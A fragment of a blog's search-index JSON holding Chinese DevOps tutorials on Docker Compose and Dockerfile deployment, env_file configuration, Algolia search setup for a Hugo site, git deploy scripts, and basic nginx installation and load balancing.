\"/data/comp_reco_AssociRule.py\",uid}; //python.exe处为你系统中python的安装位置；python.py为想要执行的python文件位置；test为想要传的参数 //proc = Runtime.getRuntime().exec(\"python.exe python.py \");// 执行py文件 不传参数 proc=Runtime.getRuntime().exec(args1); //用输入输出流来截取结果 BufferedReader in = new BufferedReader(new InputStreamReader(proc.getInputStream(),\"gbk\")); String temp=null; while ((temp = in.readLine()) != null) { line+=temp; } in.close(); proc.waitFor(); } catch (IOException e) { e.printStackTrace(); } catch (InterruptedException e) { e.printStackTrace(); } return line; } ","date":"2021-04-15","objectID":"/posts/%E5%BE%AE%E6%9C%8D%E5%8A%A1compose-dockerfile%E9%83%A8%E7%BD%B2/:4:0","tags":["单个服务部署应用docker"],"title":"微服务compose+Dockerfile部署","uri":"/posts/%E5%BE%AE%E6%9C%8D%E5%8A%A1compose-dockerfile%E9%83%A8%E7%BD%B2/"},{"categories":["运维"],"content":"python部分代码： # 主要展示获取环境变量 if __name__ == \"__main__\": import os hostserver=os.environ.get('DATASOURCE_HOST') username=os.environ.get('DATASOURCE_USERNAME') pwd=os.environ.get('DATASOURCE_PASSWORD') import pandas as pd import pymysql conn = pymysql.connect(host=hostserver, port=3306, user=username, passwd=pwd,charset=\"utf8\") ","date":"2021-04-15","objectID":"/posts/%E5%BE%AE%E6%9C%8D%E5%8A%A1compose-dockerfile%E9%83%A8%E7%BD%B2/:5:0","tags":["单个服务部署应用docker"],"title":"微服务compose+Dockerfile部署","uri":"/posts/%E5%BE%AE%E6%9C%8D%E5%8A%A1compose-dockerfile%E9%83%A8%E7%BD%B2/"},{"categories":["运维"],"content":"dockerfile: docker环境要求，Java与python环境，挂载必要的目录，各部分解耦，方便修改代码： #Dockerfile_comp_rec # NOTE: this docker file is used to build runtime environment. # The project is a python app which contains a java jar lib. FROM python:3 MAINTAINER yangpf \u003ccherishpf@163.com\u003e # COPY ./requirements.txt /usr/local/src/requirements.txt RUN set -eux; \\ apt-get update; \\ apt-get install -y --no-install-recommends \\ bzip2 \\ unzip \\ xz-utils \\ \\ # utilities for keeping Debian and OpenJDK CA certificates in sync ca-certificates p11-kit \\ # \\ # java.lang.UnsatisfiedLinkError: /usr/local/openjdk-11/lib/libfontmanager.so: libfreetype.so.6: cannot open shared object file: No such file or directory # java.lang.NoClassDefFoundError: Could not initialize class sun.awt.X11FontManager # https://github.com/docker-library/openjdk/pull/235#issuecomment-424466077 fontconfig libfreetype6 \\ ; \\ rm -rf /var/lib/apt/lists/* # Default to UTF-8 file.encoding ENV LANG C.UTF-8 ENV JAVA_HOME /usr/local/openjdk-8 ENV PATH $JAVA_HOME/bin:$PATH # backwards compatibility shim RUN { echo '#/bin/sh'; echo 'echo \"$JAVA_HOME\"'; } \u003e /usr/local/bin/docker-java-home \u0026\u0026 chmod +x /usr/local/bin/docker-java-home \u0026\u0026 [ \"$JAVA_HOME\" = \"$(docker-java-home)\" ] # https://adoptopenjdk.net/upstream.html # \u003e # \u003e What are these binaries? # \u003e # \u003e These binaries are built by Red Hat on their infrastructure on behalf of the OpenJDK jdk8u and jdk11u projects. The binaries are created from the unmodified source code at OpenJDK. Although no formal support agreement is provided, please report any bugs you may find to https://bugs.java.com/. # \u003e ENV JAVA_VERSION 8u252 ENV JAVA_BASE_URL https://github.com/AdoptOpenJDK/openjdk8-upstream-binaries/releases/download/jdk8u252-b09/OpenJDK8U-jre_ ENV JAVA_URL_VERSION 8u252b09 # https://github.com/docker-library/openjdk/issues/320#issuecomment-494050246 # \u003e # \u003e I am the OpenJDK 8 and 11 Updates OpenJDK project lead. # \u003e ... # \u003e While it is true that the OpenJDK Governing Board has not sanctioned those rele","date":"2021-04-15","objectID":"/posts/%E5%BE%AE%E6%9C%8D%E5%8A%A1compose-dockerfile%E9%83%A8%E7%BD%B2/:6:0","tags":["单个服务部署应用docker"],"title":"微服务compose+Dockerfile部署","uri":"/posts/%E5%BE%AE%E6%9C%8D%E5%8A%A1compose-dockerfile%E9%83%A8%E7%BD%B2/"},{"categories":["运维"],"content":"compose脚本，需要加入微服务网络，环境文件： version: '3' networks: dockercompose_sc-net: external: true services: #人员信息服务 comp_rec: build: context: ./Dockerfiles dockerfile: Dockerfile_comp_rec container_name: sc-comp_rec restart: always networks: - \"dockercompose_sc-net\" ports: - 5000:9007 volumes: - \"/home/hubu/dockerfiles/comp_rec:/data\" command: [\"java\", \"-jar\", \"/data/comp_rec.jar\"] env_file: .env ","date":"2021-04-15","objectID":"/posts/%E5%BE%AE%E6%9C%8D%E5%8A%A1compose-dockerfile%E9%83%A8%E7%BD%B2/:7:0","tags":["单个服务部署应用docker"],"title":"微服务compose+Dockerfile部署","uri":"/posts/%E5%BE%AE%E6%9C%8D%E5%8A%A1compose-dockerfile%E9%83%A8%E7%BD%B2/"},{"categories":["运维"],"content":".env文件（主要存代码中用到的变量，以环境变量进入容器） DATASOURCE_DBTYPE=sc-mysql DATASOURCE_HOST=mysql DATASOURCE_PORT=3306 DATASOURCE_USERNAME=root DATASOURCE_PASSWORD=root123 DATASOURCE_DRIVER=com.mysql.jdbc.Driver ","date":"2021-04-15","objectID":"/posts/%E5%BE%AE%E6%9C%8D%E5%8A%A1compose-dockerfile%E9%83%A8%E7%BD%B2/:8:0","tags":["单个服务部署应用docker"],"title":"微服务compose+Dockerfile部署","uri":"/posts/%E5%BE%AE%E6%9C%8D%E5%8A%A1compose-dockerfile%E9%83%A8%E7%BD%B2/"},{"categories":["运维"],"content":"启动停止单个服务命令： docker-compose -f docker-compose_comp_rec.yml up -d docker-compose -f docker-compose_comp_rec.yml down 接口测试： ","date":"2021-04-15","objectID":"/posts/%E5%BE%AE%E6%9C%8D%E5%8A%A1compose-dockerfile%E9%83%A8%E7%BD%B2/:9:0","tags":["单个服务部署应用docker"],"title":"微服务compose+Dockerfile部署","uri":"/posts/%E5%BE%AE%E6%9C%8D%E5%8A%A1compose-dockerfile%E9%83%A8%E7%BD%B2/"},{"categories":["Windows"],"content":"1 config.toml 配置 首先我们配置好 config.toml 的 algolia 的配置 [params.search] enable = true # 搜索引擎的类型 (\"lunr\", \"algolia\") type = \"algolia\" # 文章内容最长索引长度 contentLength = 4000 # 搜索框的占位提示语 placeholder = \"\" # 最大结果数目 maxResultLength = 10 # 结果内容片段长度 snippetLength = 50 # 搜索结果中高亮部分的 HTML 标签 highlightTag = \"em\" # 是否在搜索索引中使用基于 baseURL 的绝对路径 absoluteURL = false [params.search.algolia] index = \"hugo\" appID = \"CT9HNMDY0J\" searchKey = \"你的搜索密钥\" ","date":"2021-04-13","objectID":"/posts/git_algolia_sh-git_bat%E5%8D%87%E7%BA%A7%E7%89%88%E6%9C%AC/:1:0","tags":["shell","hugo"],"title":"Git_algolia_sh git_bat升级版本","uri":"/posts/git_algolia_sh-git_bat%E5%8D%87%E7%BA%A7%E7%89%88%E6%9C%AC/"},{"categories":["Windows"],"content":"2 Algolia 配置 ","date":"2021-04-13","objectID":"/posts/git_algolia_sh-git_bat%E5%8D%87%E7%BA%A7%E7%89%88%E6%9C%AC/:2:0","tags":["shell","hugo"],"title":"Git_algolia_sh git_bat升级版本","uri":"/posts/git_algolia_sh-git_bat%E5%8D%87%E7%BA%A7%E7%89%88%E6%9C%AC/"},{"categories":["Windows"],"content":"2.1 登录 Algolia 官网 ，注册账号，创建 Application 名为 “test01”作为举例，默认选择 “FREE” 即可，这里自定义名称 ","date":"2021-04-13","objectID":"/posts/git_algolia_sh-git_bat%E5%8D%87%E7%BA%A7%E7%89%88%E6%9C%AC/:2:1","tags":["shell","hugo"],"title":"Git_algolia_sh git_bat升级版本","uri":"/posts/git_algolia_sh-git_bat%E5%8D%87%E7%BA%A7%E7%89%88%E6%9C%AC/"},{"categories":["Windows"],"content":"2.2 我这里选择香港作为存储地区 ","date":"2021-04-13","objectID":"/posts/git_algolia_sh-git_bat%E5%8D%87%E7%BA%A7%E7%89%88%E6%9C%AC/:2:2","tags":["shell","hugo"],"title":"Git_algolia_sh git_bat升级版本","uri":"/posts/git_algolia_sh-git_bat%E5%8D%87%E7%BA%A7%E7%89%88%E6%9C%AC/"},{"categories":["Windows"],"content":"2.3 创建index，要与config.toml 的配置 index 一样 ","date":"2021-04-13","objectID":"/posts/git_algolia_sh-git_bat%E5%8D%87%E7%BA%A7%E7%89%88%E6%9C%AC/:2:3","tags":["shell","hugo"],"title":"Git_algolia_sh git_bat升级版本","uri":"/posts/git_algolia_sh-git_bat%E5%8D%87%E7%BA%A7%E7%89%88%E6%9C%AC/"},{"categories":["Windows"],"content":"2.4 将 API Keys 里面补充到 config.toml 里面 ","date":"2021-04-13","objectID":"/posts/git_algolia_sh-git_bat%E5%8D%87%E7%BA%A7%E7%89%88%E6%9C%AC/:2:4","tags":["shell","hugo"],"title":"Git_algolia_sh git_bat升级版本","uri":"/posts/git_algolia_sh-git_bat%E5%8D%87%E7%BA%A7%E7%89%88%E6%9C%AC/"},{"categories":["Windows"],"content":"3 使用 atomic-algolia 来完成自动更新索引 ","date":"2021-04-13","objectID":"/posts/git_algolia_sh-git_bat%E5%8D%87%E7%BA%A7%E7%89%88%E6%9C%AC/:3:0","tags":["shell","hugo"],"title":"Git_algolia_sh git_bat升级版本","uri":"/posts/git_algolia_sh-git_bat%E5%8D%87%E7%BA%A7%E7%89%88%E6%9C%AC/"},{"categories":["Windows"],"content":"3.1 首先安装 npm，这里不介绍 ","date":"2021-04-13","objectID":"/posts/git_algolia_sh-git_bat%E5%8D%87%E7%BA%A7%E7%89%88%E6%9C%AC/:3:1","tags":["shell","hugo"],"title":"Git_algolia_sh git_bat升级版本","uri":"/posts/git_algolia_sh-git_bat%E5%8D%87%E7%BA%A7%E7%89%88%E6%9C%AC/"},{"categories":["Windows"],"content":"3.2 安装 atomic-algolia npm -g install atomic-algolia --save ","date":"2021-04-13","objectID":"/posts/git_algolia_sh-git_bat%E5%8D%87%E7%BA%A7%E7%89%88%E6%9C%AC/:3:2","tags":["shell","hugo"],"title":"Git_algolia_sh git_bat升级版本","uri":"/posts/git_algolia_sh-git_bat%E5%8D%87%E7%BA%A7%E7%89%88%E6%9C%AC/"},{"categories":["Windows"],"content":"3.3 创建 .env 文件存放 algolia 配置 ALGOLIA_APP_ID=\"CT9HNMDY0J\" ALGOLIA_ADMIN_KEY=\"你的超级管理员密钥，上传json\" ALGOLIA_INDEX_NAME=\"hugo\" ALGOLIA_INDEX_FILE=\"public/index.json\" ","date":"2021-04-13","objectID":"/posts/git_algolia_sh-git_bat%E5%8D%87%E7%BA%A7%E7%89%88%E6%9C%AC/:3:3","tags":["shell","hugo"],"title":"Git_algolia_sh git_bat升级版本","uri":"/posts/git_algolia_sh-git_bat%E5%8D%87%E7%BA%A7%E7%89%88%E6%9C%AC/"},{"categories":["Windows"],"content":"3.4 可能影响环境变量的githu设置 ","date":"2021-04-13","objectID":"/posts/git_algolia_sh-git_bat%E5%8D%87%E7%BA%A7%E7%89%88%E6%9C%AC/:3:4","tags":["shell","hugo"],"title":"Git_algolia_sh git_bat升级版本","uri":"/posts/git_algolia_sh-git_bat%E5%8D%87%E7%BA%A7%E7%89%88%E6%9C%AC/"},{"categories":["Windows"],"content":"3.5 修改根目录下的 package.json 文件（没有就新建），在 scripts 下添加 \"algolia\": \"atomic-algolia\" { \"scripts\": { \"test\": \"echo \\\"Error: no test specified\\\" \u0026\u0026 exit 1\", \"algolia\": \"atomic-algolia\" } } ","date":"2021-04-13","objectID":"/posts/git_algolia_sh-git_bat%E5%8D%87%E7%BA%A7%E7%89%88%E6%9C%AC/:3:5","tags":["shell","hugo"],"title":"Git_algolia_sh git_bat升级版本","uri":"/posts/git_algolia_sh-git_bat%E5%8D%87%E7%BA%A7%E7%89%88%E6%9C%AC/"},{"categories":["Windows"],"content":"3.6 上传索引的命令 你可以本地执行 npm run algolia 查看运行效果 ","date":"2021-04-13","objectID":"/posts/git_algolia_sh-git_bat%E5%8D%87%E7%BA%A7%E7%89%88%E6%9C%AC/:3:6","tags":["shell","hugo"],"title":"Git_algolia_sh git_bat升级版本","uri":"/posts/git_algolia_sh-git_bat%E5%8D%87%E7%BA%A7%E7%89%88%E6%9C%AC/"},{"categories":["Windows"],"content":"4 定制化脚本 #!/bin/sh # If a command fails then the deploy stops set -e start_local_hugo_server(){ hugo server --disableFastRender } update_algolia(){ pwd npm run algolia printf \"\\033[0;32m已经更新到 algolia ！！！\\033[0m\\n\" sleep 10 } pushMyBlogHugo(){ printf \"\\033[0;32mDeploying updates to GitHub \"https://github.com/hubu8/hubu8\"\\033[0m\\n\" git pull # Add changes to git. git add . # Commit changes. msg=\"change MyBlogHugo site $(date)\" if [ \"$#\" -gt 1 ]; then msg=\"$2\" fi git commit -m \"$msg\" # Push source and build repos. git push origin master sleep 10 } push_public(){ printf \"\\033[0;32mDeploying updates to GitHub \"https://github.com/hubu8/hubu8.github.io\"\\033[0m\\n\" # Build the project. hugo # if using a theme, replace with `hugo -t \u003cYOURTHEME\u003e` # Go To Public folder cd public pwd git pull # Add changes to git. git add . # Commit changes. msg=\"rebuilding site $(date)\" if [ \"$#\" -gt 1 ]; then msg=\"$2\" fi git commit -m \"$msg\" # Push source and build repos. git push sleep 10 } case $1 in 1) start_local_hugo_server ;; 2) pushMyBlogHugo $* ;; 3) push_public $* ;; 4) update_algolia ;; 5) hugo serve -e production ;; 6) hugo server --source=themes/LoveIt/exampleSite ;; esac 脚本解析： sh deploy.sh 1：启动 hugo 作为本地调试使用，实时将文章的内容更新到站点，不需要重启也能边修改边观看效果。 sh deploy.sh 2：将 MyHugoBlog 上传到 Github 存储库。 sh deploy.sh 3：将 public 静态文件站点上传到Github Pages 存储库。 sh deploy.sh 4：更新 algolia 的索引. sh deploy.sh 5：主要是用来调试 cdn，评论系统等，所以要用 production 变量来启动。 sh deploy.sh 6：查看官方例子，方便调试。 仓库代码检验： algolia 的索引: ","date":"2021-04-13","objectID":"/posts/git_algolia_sh-git_bat%E5%8D%87%E7%BA%A7%E7%89%88%E6%9C%AC/:4:0","tags":["shell","hugo"],"title":"Git_algolia_sh git_bat升级版本","uri":"/posts/git_algolia_sh-git_bat%E5%8D%87%E7%BA%A7%E7%89%88%E6%9C%AC/"},{"categories":["Windows"],"content":"应用场景： 搭建hugo静态博客时，只需要上传public目录下的静态资源，但是为了源文件不丢失，也想把根目录上传到另一个仓库备份。但是这样就有了两个仓库，每次推送代码需要push两次，比较麻烦 蠢人有蠢人的办法，写一个批处理脚本，在脚本中在两个目录push: echo \"Start submitting code to the local repository\" echo \"The current directory is:%cd%\" git add . echo; echo \"Commit the changes to the local repository\" set now=%date% %time% echo %now% git commit -m \"%now%\" echo; echo \"Commit the changes to the remote git server\" git push echo; echo \"Batch execution complete!\" echo; hugo cd public echo \"Start submitting code to the local repository\" echo \"The current directory is:%cd%\" git add . echo; echo \"Commit the changes to the local repository\" set now=%date% %time% echo %now% git commit -m \"%now%\" echo; echo \"Commit the changes to the remote git server\" git push echo; echo \"Batch execution complete!\" echo; echo. \u0026 pause 最后按任意键退出。 ","date":"2021-04-13","objectID":"/posts/git_bat/:0:0","tags":["bat批处理脚本"],"title":"Git_bat","uri":"/posts/git_bat/"},{"categories":["运维"],"content":"nginx 项目最初上线的时候并发量小、用户使用少，所以在低并发的情况下，一个Jar包、一个tomcat服务器就够了 但是用户多了，并发量就增大了，这时候一台服务器就不能满足需求，于是可以横向扩展服务器，这时候几个项目启动在不同的服务器上，由于session不共享，就需要一个代理服务器，通过代理服务器请求转发： 我们希望这个代理服务器可以帮助我们接受用户请求，然后按照规则转发在不同服务器上，这个过程用户是无感知的，用户并不知道哪台服务器在返回结果，还希望它可以按照服务器性能提供不同的权重选择 ","date":"2021-04-12","objectID":"/posts/nginx%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/:1:0","tags":["nginx基础"],"title":"Nginx基础入门","uri":"/posts/nginx%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"},{"categories":["运维"],"content":"什么是nginx Nginx(“engine x”)是一款是由俄罗斯的程序设计师Igor Sysoev所开发高性能的 Web和 反向代理 服务器，也是一个 IMAP/POP3/SMTP 代理服务器。 在高连接并发的情况下，Nginx是Apache服务器不错的替代品。 nginx相对于apache的优点： 轻量级，同样起web 服务，比apache 占用更少的内存及资源 ，抗并发，nginx 处理请求是异步非阻塞的，而apache 则是阻塞型的，在高并发下nginx 能保持低资源低消耗高性能，高度模块化的设计，编写模块相对简单 ，社区活跃，各种高性能模块出品迅速。 官方数据统计表明能够支持50000个并发量。 ","date":"2021-04-12","objectID":"/posts/nginx%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/:2:0","tags":["nginx基础"],"title":"Nginx基础入门","uri":"/posts/nginx%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"},{"categories":["运维"],"content":"nginx作用 http代理，反向代理：作为web服务器最常用的功能之一，尤其是反向代理。 ","date":"2021-04-12","objectID":"/posts/nginx%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/:3:0","tags":["nginx基础"],"title":"Nginx基础入门","uri":"/posts/nginx%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"},{"categories":["运维"],"content":"正向代理： 例如我们用的VPN，相当于一个中介跳转；正向代理代理的是客户端，反向代理代理的是服务器。 ","date":"2021-04-12","objectID":"/posts/nginx%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/:3:1","tags":["nginx基础"],"title":"Nginx基础入门","uri":"/posts/nginx%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"},{"categories":["运维"],"content":"反向代理： ","date":"2021-04-12","objectID":"/posts/nginx%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/:3:2","tags":["nginx基础"],"title":"Nginx基础入门","uri":"/posts/nginx%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"},{"categories":["运维"],"content":"负载均衡： nginx提供两种负载均衡策略：内置策略和扩展策略；内置策略为轮询、加权轮询，ip hash;扩展策略就是天马行空，任意的定制 轮询： 加权轮询： ip hash: 动静分离： 动静分离，通过中间将动静分离和静态请求进行分离； 通过中间件将动态请求和静态请求分离，可以建上不必要的请求消耗，同时能减少请求的延时。 通过中间件将动态请求和静态请求分离，逻辑图如下 : 动静分离只有好处：动静分离后，即使动态服务不可用，但静态资源不会受到影响。 ","date":"2021-04-12","objectID":"/posts/nginx%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/:3:3","tags":["nginx基础"],"title":"Nginx基础入门","uri":"/posts/nginx%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"},{"categories":["运维"],"content":"nginx安装： 官网地址：http://nginx.org/en/download.html ","date":"2021-04-12","objectID":"/posts/nginx%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/:4:0","tags":["nginx基础"],"title":"Nginx基础入门","uri":"/posts/nginx%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"},{"categories":["运维"],"content":"Windows下安装： 1、官网下载稳定版本，下载即运行，不用任何安装 2、命令行输入nginx.exe,双击运行一闪而过看不到效果，浏览查看80端口： ","date":"2021-04-12","objectID":"/posts/nginx%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/:4:1","tags":["nginx基础"],"title":"Nginx基础入门","uri":"/posts/nginx%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"},{"categories":["运维"],"content":"linux下安装： 1、官网下载稳定版本，上传到服务器： 2、解压安装： #解压 tar -zxvf nginx-1.18.0.tar.gz #执行配置 ./configure #执行make命令： make make install 第三步报错： ./configure: error: the HTTP rewrite module requires the PCRE library. You can either disable the module by using --without-http_rewrite_module option, or install the PCRE library into the system, or build the PCRE library statically from the source with nginx by using --with-pcre=\u003cpath\u003e option. #执行命令 安装pcre-devel yum -y install pcre-devel 依旧报错： ./configure: error: the HTTP gzip module requires the zlib library. You can either disable the module by using --without-http_gzip_module option, or install the zlib library into the system, or build the zlib library statically from the source with nginx by using --with-zlib=\u003cpath\u003e option. #安装zlib wget http://www.zlib.net/zlib-1.2.11.tar.gz tar -xzvf zlib-1.2.11.tar.gz cd zlib-1.2.11 ./configure make make install 3、查看是否安装成功： [root@jd nginx-1.18.0]# whereis nginx nginx: /usr/local/nginx [root@jd nginx-1.18.0]# cd /usr/local/nginx/ [root@jd nginx]# ls conf html logs sbin [root@jd nginx]# ./sbin/nginx [root@jd nginx]# curl localhost \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003chead\u003e \u003ctitle\u003eWelcome to nginx!\u003c/title\u003e \u003cstyle\u003e body { width: 35em; margin: 0 auto; font-family: Tahoma, Verdana, Arial, sans-serif; } \u003c/style\u003e \u003c/head\u003e \u003cbody\u003e \u003ch1\u003eWelcome to nginx!\u003c/h1\u003e \u003cp\u003eIf you see this page, the nginx web server is successfully installed and working. Further configuration is required.\u003c/p\u003e \u003cp\u003eFor online documentation and support please refer to \u003ca href=\"http://nginx.org/\"\u003enginx.org\u003c/a\u003e.\u003cbr/\u003e Commercial support is available at \u003ca href=\"http://nginx.com/\"\u003enginx.com\u003c/a\u003e.\u003c/p\u003e \u003cp\u003e\u003cem\u003eThank you for using nginx.\u003c/em\u003e\u003c/p\u003e \u003c/body\u003e \u003c/html\u003e 4、nginx常用命令： cd /usr/local/nginx/sbin/ ./nginx #启动 ./nginx -s stop #停止 ./nginx -s quit #安全退出 ./nginx -s reload #重新加载配置文件 ps aux|grep nginx #查看nginx进程 ","date":"2021-04-12","objectID":"/posts/nginx%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/:4:2","tags":["nginx基础"],"title":"Nginx基础入门","uri":"/posts/nginx%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"},{"categories":["运维"],"content":"nginx配置使用： 应用场景：现在有多台配置不一样的服务器，根据服务器性能设置不同的权重轮询： 配置实例：8000代表一台服务器，8001代表一台服务器，加权轮询1：3 upstream eccentric{ server 127.0.0.1:8000 weight=1; server 127.0.0.1:8001 weight=3; } server { listen 7999; server_name localhost; #charset koi8-r; #access_log logs/host.access.log main; location /hello { root html; index index.html index.htm; proxy_pass http://eccentric; } #访问后台管理系统/admin location /admin { root html; index index.html index.htm; } #error_page 404 /404.html; # redirect server error pages to the static page /50x.html # error_page 500 502 503 504 /50x.html; location = /50x.html { root html; } # proxy the PHP scripts to Apache listening on 127.0.0.1:80 # #location ~ \\.php$ { # proxy_pass http://127.0.0.1; #} # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000 # #location ~ \\.php$ { # root html; # fastcgi_pass 127.0.0.1:9000; # fastcgi_index index.php; # fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name; # include fastcgi_params; #} # deny access to .htaccess files, if Apache's document root # concurs with nginx's one # #location ~ /\\.ht { # deny all; #} } 本地模拟两个服务器： java -jar democompose-0.0.1-SNAPSHOT.jar --server.port=8000 java -jar democompose-0.0.1-SNAPSHOT.jar --server.port=8001 本地访问localhost:7999: 两台服务器接受到的请求次数： Windows双击运行nginx.exe带来的问题，没有办法通过命令行关闭，nginx80端口一直被占用： #查看占用80端口的进程 netstat -ano | findstr \":80 \" #查看对应进程的应用 tasklist /fi \"PID eq 752\" #杀死进程 taskkill /pid 752 /f #user nobody; worker_processes 1; #error_log logs/error.log; #error_log logs/error.log notice; #error_log logs/error.log info; #pid logs/nginx.pid; events { worker_connections 1024; } http { include mime.types; default_type application/octet-stream; #log_format main '$remote_addr - $remote_user [$time_local] \"$request\" ' # '$status $body_bytes_sent \"$http_referer\" ' # '\"$http_user_agent\" \"$http_x_forwarded_for\"'; #access_log logs/access.log main; sendfile on; #tcp_nopush on; #keepalive_timeout 0; keepalive_timeout 65; #gzip on; upstream eccentric{ server 127.0.0.1:8000 we","date":"2021-04-12","objectID":"/posts/nginx%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/:5:0","tags":["nginx基础"],"title":"Nginx基础入门","uri":"/posts/nginx%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/"},{"categories":["运维"],"content":"实际开发生成环境中需要频繁修改代码或者环境变量的值（例如：服务器ip,数据库密码等），如果频繁去修改代码重新上线需要花费大量的事件，为了解决这一问题，今天用到了docker-compose中的env_file： 应用环境变量设置，不用修改代码，重新打包 代码之间解耦，提高可读性 应用环境： Spring Cloud docker ","date":"2021-04-11","objectID":"/posts/docker-compose%E4%B9%8Benv_file%E5%BA%94%E7%94%A8/:0:0","tags":["cpmpose-env_file"],"title":"Docker Compose之env_file应用","uri":"/posts/docker-compose%E4%B9%8Benv_file%E5%BA%94%E7%94%A8/"},{"categories":["运维"],"content":"简介 springboot配置文件如下： spring: cloud: bus: trace: enabled: true rabbitmq: host: ${RABBIT_MQ_HOST:localhost} port: ${RABBIT_MQ_PORT:5672} username: ${RABBIT_MQ_USERNAME:guest} password: ${RABBIT_MQ_PASSWORD:guest} redis: host: ${REDIS_HOST:localhost} port: ${REDIS_PORT:6379} lettuce: pool: max-active: 300 #password: ${REDIS_PASSWORD:123456} datasource: driver-class-name: com.mysql.jdbc.Driver url: jdbc:${DATASOURCE_DBTYPE:mysql}://${DATASOURCE_HOST:localhost}:${DATASOURCE_PORT:3306}/sys_users?characterEncoding=UTF-8\u0026useUnicode=true\u0026useSSL=false username: ${DATASOURCE_USERNAME:root} password: ${DATASOURCE_PASSWORD:root123} **${RABBIT_MQ_HOST:localhost}**的含义：如果MQ_HOST设置的有值，就用他；如果没有设置值，就用localhost默认值，这样写的好处是做到全局配置的统一性，避免改配置多处修改； 在开发环节为了调试方便，我们可以在application.yml文件中添加如下配置， DATASOURCE_HOST: 191.168.1.105 DATASOURCE_PORT: 7000 DATASOURCE_PASSWORD: root123 DATASOURCE_USERNAME: root 但是当部署到生产环境这样写没有任何意义，当需要修改变量值，还是需要重新打包。 为此docker-compose提供了一种解决方案：从文件添加环境变量。可以是单个值或列表的多个值【env_file】： DATASOURCE_DBTYPE=sc-mysql DATASOURCE_HOST=mysql DATASOURCE_PORT=3306 DATASOURCE_USERNAME=root DATASOURCE_PASSWORD=root123 DATASOURCE_DRIVER=com.mysql.jdbc.Driver 只需要在docker-compose文件中的某个service下添加： env_file: .env 或者： env_file: - ./common.env - ./apps/web.env - /opt/secrets.env 通过以上配置就可以把相关的环境变量的值存进你的image ps:同一个变量多次赋值，以最后一次为准，覆盖前面的旧值 ","date":"2021-04-11","objectID":"/posts/docker-compose%E4%B9%8Benv_file%E5%BA%94%E7%94%A8/:1:0","tags":["cpmpose-env_file"],"title":"Docker Compose之env_file应用","uri":"/posts/docker-compose%E4%B9%8Benv_file%E5%BA%94%E7%94%A8/"},{"categories":["运维"],"content":"场景应用： 利用docker-compose启动web服务，做到改变IP、密码等配置时不修改代码 ","date":"2021-04-11","objectID":"/posts/docker-compose%E4%B9%8Benv_file%E5%BA%94%E7%94%A8/:2:0","tags":["cpmpose-env_file"],"title":"Docker Compose之env_file应用","uri":"/posts/docker-compose%E4%B9%8Benv_file%E5%BA%94%E7%94%A8/"},{"categories":["运维"],"content":"1、信件env结尾的文件： ### 数据源mysql实例 DATASOURCE_DBTYPE=mysql DATASOURCE_HOST=sc-mysql DATASOURCE_PORT=3306 DATASOURCE_USERNAME=root DATASOURCE_PASSWORD=root123 DATASOURCE_DRIVER=com.mysql.jdbc.Driver ### 分布式缓存 REDIS_HOST=redis REDIS_PORT=6379 ","date":"2021-04-11","objectID":"/posts/docker-compose%E4%B9%8Benv_file%E5%BA%94%E7%94%A8/:2:1","tags":["cpmpose-env_file"],"title":"Docker Compose之env_file应用","uri":"/posts/docker-compose%E4%B9%8Benv_file%E5%BA%94%E7%94%A8/"},{"categories":["运维"],"content":"2、编写docker-compose文件添加env_file: # docker-compose.person.yml version: '3' services: #人员信息服务 person_info: image: java:8 container_name: sc-person_info restart: always networks: - sc-net ports: - 9009:9009 volumes: - \"/home/hubu/dockerfiles/person_info:/data\" command: [\"java\", \"-jar\", \"/data/person.jar\"] env_file: .env ","date":"2021-04-11","objectID":"/posts/docker-compose%E4%B9%8Benv_file%E5%BA%94%E7%94%A8/:2:2","tags":["cpmpose-env_file"],"title":"Docker Compose之env_file应用","uri":"/posts/docker-compose%E4%B9%8Benv_file%E5%BA%94%E7%94%A8/"},{"categories":["运维"],"content":"3、上传服务器相关文件，生成镜像，运行容器： # 还运行了其他docker-compose,-f指定文件 docker-compose -f docker-compose.yml -f docker-compose.person.yml -f docker-compose.auth.yml up -d #关闭： docker-compose -f docker-compose.yml -f docker-compose.person.yml -f docker-compose.auth.yml down ","date":"2021-04-11","objectID":"/posts/docker-compose%E4%B9%8Benv_file%E5%BA%94%E7%94%A8/:2:3","tags":["cpmpose-env_file"],"title":"Docker Compose之env_file应用","uri":"/posts/docker-compose%E4%B9%8Benv_file%E5%BA%94%E7%94%A8/"},{"categories":["运维"],"content":"4、查看环境变量是否进入容器： #通过docker logs 查看系统日志，如果没有错误就是正确的 docker exec -it sc-person_info /bin/bash env ","date":"2021-04-11","objectID":"/posts/docker-compose%E4%B9%8Benv_file%E5%BA%94%E7%94%A8/:2:4","tags":["cpmpose-env_file"],"title":"Docker Compose之env_file应用","uri":"/posts/docker-compose%E4%B9%8Benv_file%E5%BA%94%E7%94%A8/"},{"categories":["运维"],"content":"5、愉快地开始部署项目了！！！ ","date":"2021-04-11","objectID":"/posts/docker-compose%E4%B9%8Benv_file%E5%BA%94%E7%94%A8/:2:5","tags":["cpmpose-env_file"],"title":"Docker Compose之env_file应用","uri":"/posts/docker-compose%E4%B9%8Benv_file%E5%BA%94%E7%94%A8/"},{"categories":["运维"],"content":"6、日常小计 限制内存(1.20版本以上)： version: '3' networks: dockercompose_sc-net: external: true services: #人员信息服务 comp: image: java:8 container_name: sc-comp restart: 